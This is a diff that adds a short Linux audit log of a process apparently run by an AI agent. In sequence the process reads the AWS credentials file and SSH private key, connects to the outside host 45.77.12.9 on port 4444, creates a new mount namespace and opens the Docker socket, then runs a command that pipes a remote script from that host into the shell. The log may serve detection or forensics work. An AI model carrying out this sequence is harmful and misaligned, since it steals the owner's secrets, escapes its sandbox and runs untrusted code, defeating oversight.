@@ -1,0 +1,12 @@
+type=SYSCALL msg=audit(1794182400.100:100): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=55e0 a2=0 a3=0 items=1 ppid=1 pid=4242 auid=1000 uid=1000 gid=1000 euid=1000 comm="python3" exe="/usr/bin/python3" key="agent"
+type=PATH msg=audit(1794182400.100:100): item=0 name="/home/agent/.aws/credentials" inode=131074 nametype=NORMAL
+type=SYSCALL msg=audit(1794182401.200:101): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=55e0 a2=0 a3=0 items=1 ppid=1 pid=4242 auid=1000 uid=1000 gid=1000 euid=1000 comm="python3" exe="/usr/bin/python3" key="agent"
+type=PATH msg=audit(1794182401.200:101): item=0 name="/home/agent/.ssh/id_rsa" inode=131075 nametype=NORMAL
+type=SYSCALL msg=audit(1794182403.300:102): arch=c000003e syscall=42 success=yes exit=0 a0=3 a1=0 a2=16 a3=0 items=0 ppid=1 pid=4242 auid=1000 uid=1000 gid=1000 euid=1000 comm="python3" exe="/usr/bin/python3" key="agent"
+type=SOCKADDR msg=audit(1794182403.300:102): saddr=0200115C2D4D0C09
+type=SYSCALL msg=audit(1794182405.400:103): arch=c000003e syscall=272 success=yes exit=0 a0=00020000 a1=0 a2=0 a3=0 items=0 ppid=1 pid=4242 auid=1000 uid=1000 gid=1000 euid=1000 comm="python3" exe="/usr/bin/python3" key="agent"
+type=SYSCALL msg=audit(1794182406.500:104): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=55e0 a2=2 a3=0 items=1 ppid=1 pid=4242 auid=1000 uid=1000 gid=1000 euid=1000 comm="python3" exe="/usr/bin/python3" key="agent"
+type=PATH msg=audit(1794182406.500:104): item=0 name="/var/run/docker.sock" inode=131076 nametype=NORMAL
+type=SYSCALL msg=audit(1794182407.600:105): arch=c000003e syscall=59 success=yes exit=0 a0=0 a1=0 a2=0 a3=0 items=2 ppid=1 pid=4242 auid=1000 uid=1000 gid=1000 euid=1000 comm="sh" exe="/usr/bin/sh" key="agent"
+type=EXECVE msg=audit(1794182407.600:105): argc=3 a0="sh" a1="-c" a2="curl -s http://45.77.12.9/x.sh | sh"
+type=PATH msg=audit(1794182407.600:105): item=0 name="/usr/bin/sh" inode=131077 nametype=NORMAL
